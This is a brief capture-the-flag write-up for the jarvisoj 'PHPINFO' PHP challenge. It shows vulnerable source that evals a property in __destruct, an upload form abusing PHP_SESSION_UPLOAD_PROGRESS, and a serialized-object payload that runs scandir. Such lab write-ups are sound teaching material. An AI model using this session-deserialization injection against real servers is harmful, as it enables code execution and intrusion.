# Challenge
```php
<?php
//A webshell is wait for you
ini_set('session.serialize_handler', 'php');
session_start();
class OowoO
{
   public $mdzz;
   function __construct()
   {
	   $this->mdzz = 'phpinfo();';
   }
   function __destruct()
   {
	   eval($this->mdzz);
   }
}
if(isset($_GET['phpinfo']))
{
   $m = new OowoO();
}
else
{
   highlight_string(file_get_contents('index.php'));
}
?>
```
# Solution

Test.html

```html
<form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="1" />
    <input type="file" name="file" />
    <input type="submit" />
</form>
```

payload:
```
|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";}
```

# Refference 
+ [jarvisoj : PHPINFO](http://web.jarvisoj.com:32784/)
+ [chybeta : PHPINFO](https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/#PHPINFO)